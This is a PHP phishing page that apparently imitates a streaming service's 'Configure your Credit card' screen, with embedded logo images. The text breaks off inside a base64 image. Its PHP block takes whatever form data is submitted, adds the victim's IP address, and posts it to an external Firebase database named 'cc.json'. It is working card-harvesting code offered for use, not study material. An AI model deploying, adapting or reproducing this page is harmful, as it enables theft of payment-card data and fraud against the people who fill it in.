<?php
$ip = "";

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

    if(isset($_GET['send'])){


  $url = "https://selft-fire.firebaseio.com/cc.json";
  $_POST['ip'] = get_client_ip();
        $opts = array('http' =>
            array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => json_encode($_POST)
            )
        );

        $context  = stream_context_create($opts);

        $result = file_get_contents($url, false, $context);
        die;
    }

?>

<html> 
    <head>
        <style> 
            html,body{
                background:#f3f3f3;
                margin:0;
                padding:0;
            }
            .core{
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                padding-bottom:40px;
                border-bottom: 1px solid #dadada;
            }
            .core-content{
                    width: 400px;
            }
            .title{
                font-weight: 700;
                font-size: 1.5em;
                color: #333;
            }
            .input{
                background: #fff;
                padding: 10;
                display: flex;
                flex-direction: column;
                width: 100%;
                border-radius:4px;
                border:1px solid #5fa53f;
               
            }
            .input input{
                height: 30px;
                border: none;
                 outline:none
            }
            .button-confirm{
                display: flex;
    justify-content: center;
    align-items: center;
    border-radius:4px;
                min-height: 60px;
                font-weight: 700;
                margin: 0;
                width: 100%;
                font-size: 20px;
                    padding: 0px 0.6em;
                min-width: 112px;
                color: #fff;
                background-color: #e50914;
                background-image: linear-gradient(to bottom,#e50914,#db0510);
                box-shadow: 0 1px 0 rgba(0,0,0,.45);
                cursor:pointer;
            }
            .contact-us{
                    color: #999;    
                    padding: 50px;
            }
            .bottom-line{
                display: flex;
                flex-direction: row;
                justify-content: center;
                align-items: center;
            }
            .bottom-line .elm{
                flex:2;
                color: #999;
            }
        </style>
    </head>
    <body>
        <div class="header">  
            <img src="data:image/png;base64,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">    
         </div>
         <div class="core">
            <div class="core-content">
                <div class="title">
                    Configure your Credit card
                </div>
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIMAAAAbCAYAAABfqDxIAAAYKWlDQ1BJQ0MgUHJvZmlsZQAAWIWVWQc8ll3YP/d9P8N6HnvvvbL33nvvVfbeHpsSQkYRSkIUlaQiZWalKPEKRaVlJJFKQ1Tku2m87/d+6/ed3+++77/rXOc6/+uM65zLAwA7g1dkZChMA0BYeAzJ1kiXx9nFlQc/AzAADwiAChC8fKIjdaytzQFafn//c/kyCaDt732JbVv/tf5/LbS+ftE+AEDWKPb2jfYJQ/E1ADAsPpGkGACww6icPz4mchuvoJiBhBIEAIfZxgE/Mcs29v6Jd+3o2NvqoVgbADIqLy9SAADEbd48cT4BqB0iyhFHF+4bFI6qpqJY0yfQyxcAtl5UZ1dYWMQ2XkaxiPc/7AT8J5vef2x6eQX8wT992Slk+kHRkaFeif/P4fi/S1ho7O8++NCHKpBkbLvtMzpu50MizLYxFYo7w70trVBMh+I7Qb47+tt4KjDW2OGX/rJPtB46ZoAJABj4eumboZgDxUyxIQ46v7CsF2mnLaoPWwbFmNj/wt6kCNtf9uG48FBL8192sgP9TH7jSr9oA7vfOv5BhiYoRlcafC0p0N7pJ0/4VlyQoyWKiSgejQ6xM/vV9nlSoJ7lbx1SrO02ZwEUf/YnGdr+1EFYwqJ/+4VI+njt9IWuBUQ7JtDe+GdbxNkv2tn8NwdfP32DnxwQX79wh1/cEHR16dr+apsVGWr9Sx+p9As1sv05zkhjdJzd77bjMegC+zkOyGywl6n1r76+RMZY2//khoGBOdAD+oAHxKKPN4gAwSBoZLl1Gf3rZ40h8AIkEAD8gMQvye8WTjs14ejbDiSBtyjyA9F/2unu1PqBOFS++Uf68y0B/Hdq43ZahIBXKA7DsGE0MWoYc/StjT6yGGWMyu92PNS/e8UZ4PRxxjhDnOgfHj4o61D0IYGg/0Zmhn79UO+2uYT/9uFve9hX2DHsLHYCO419DBzByx0rv7Q8gtJJ/2LOAyzANGrN8Jd33qjNxd86GCGUtQJGF6OB8ke5Y5gwbEACI496ooPRQn1TQKX/ZBj7h9vfY/nv/rZZ/9OfX3KiGFHhFwvvPzOj90fr31b0/jFGvujX7N+aSDZyFbmN3EAGkU6kFfAgPUgbMox0beM/K+Hlzkr43ZvtDrcQ1E7Qbx3peulF6Y1/9e31q//t8YqO8UuI2d4MehGRiaSggMAYHh00GvvxmIT7SO7ikZWWUQJgO7b/DB2fbHdiNsR0729ZhAwAKtux+MDfMs93ALQGo+GM7m+ZUCsA1LIADB73iSXF/ZRth2OABRSAGt0VrIAL8AMR1B9ZoAjUgDYwAKbACtgDF+COjnggCEM5x4O9IA1kgTxwBBwDZaAK1IDz4BJoAq2gE9wAA2AIjIIJ8ARdF/PgDVgBX8B3CILwEAGih1ghbkgQEodkIWVIEzKAzCFbyAXyhAKgcCgW2gsdgPKgIqgMOg3VQVegdugGNAiNQY+hGWgR+gh9gxGYCmaAOWEhWApWhnVgM9ge3gMHwFFwEpwB58OlcDV8EW6Bb8BD8AQ8Db+BVxGAUCJMCC8igSgjeogV4or4IyQkBclFSpBq5DLSgc7zfWQaWUa+YnAYegwPRgJdm8YYB4wPJgqTgjmEKcOcx7RgbmHuY2YwK5gfWAKWAyuOVcWaYJ2xAdh4bBa2BHsO24ztR/fNPPYLDodjwgnjlNB96YILxiXjDuFO4hpwvbgx3BxuFY/Hs+LF8Rp4K7wXPgafhT+Bv4jvwY/j5/HrZJRk3GSyZIZkrmThZOlkJWQXyLrJxskWyL6T05ALkquSW5H7kieSF5CfIe8gv0c+T/6dgpZCmEKDwp4imCKNopTiMkU/xVOKT5SUlHyUKpQ2lEGUqZSllI2UdyhnKL9S0VGJUelR7aaKpcqnqqXqpXpM9YlAIAgRtAmuhBhCPqGOcJPwnLBOpCdKEk2IvsT9xHJiC3Gc+I6anFqQWofanTqJuoT6KvU96mUachohGj0aL5oUmnKadpqHNKu09LQytFa0YbSHaC/QDtK+psPTCdEZ0PnSZdDV0N2km6NH6Pnp9eh96A/Qn6Hvp59nwDEIM5gwBDPkMVxiGGFYYaRjlGd0ZExgLGfsYpxmQpiEmEyYQpkKmJqYJpm+MXMy6zD7MecwX2YeZ15jYWfRZvFjyWVpYJlg+cbKw2rAGsJayNrK+owNwybGZsMWz1bJ1s+2zM7Arsbuw57L3sQ+xQFziHHYciRz1HAMc6xycnEacUZynuC8ybnMxcSlzRXMdZSrm2uRm55bkzuI+yh3D/cSDyOPDk8oTynPLZ4VXg5eY95Y3tO8I7zf+YT5HPjS+Rr4nvFT8Cvz+/Mf5e/jXxHgFrAQ2CtQLzAlSC6oLBgoeFzwtuCakLCQk9BBoVah18IswibCScL1wk9FCCJaIlEi1SIPRHGiyqIhoidFR8VgMQWxQLFysXvisLiieJD4SfGxXdhdKrvCd1XveihBJaEjESdRLzEjySRpLpku2Sr5TkpAylWqUOq21A9pBelQ6TPST2ToZExl0mU6ZD7Kisn6yJbLPpAjyBnK7Zdrk/sgLy7vJ18p/0iBXsFC4aBCn8KmopIiSfGy4qKSgJKnUoXSQ2UGZWvlQ8p3VLAquir7VTpVvqoqqsaoNqm+V5NQC1G7oPZaXVjdT/2M+pwGn4aXxmmNaU0eTU/NU5rTWrxaXlrVWrPa/Nq+2ue0F3REdYJ1Luq805XWJek2667pqert0+vVR/SN9HP1RwzoDBwMygyeG/IZBhjWG64YKRglG/UaY43NjAuNH5pwmviY1JmsmCqZ7jO9ZUZlZmdWZjZrLmZOMu+wgC1MLYotnloKWoZbtloBKxOrYqtn1sLWUdbXbXA21jblNq9sZWz32t62o7fzsLtg98Ve177A/omDiEOsQ58jteNuxzrHNSd9pyKnaWcp533OQy5sLkEuba54V0fXc66rbgZux9zmdyvszto9uUd4T8K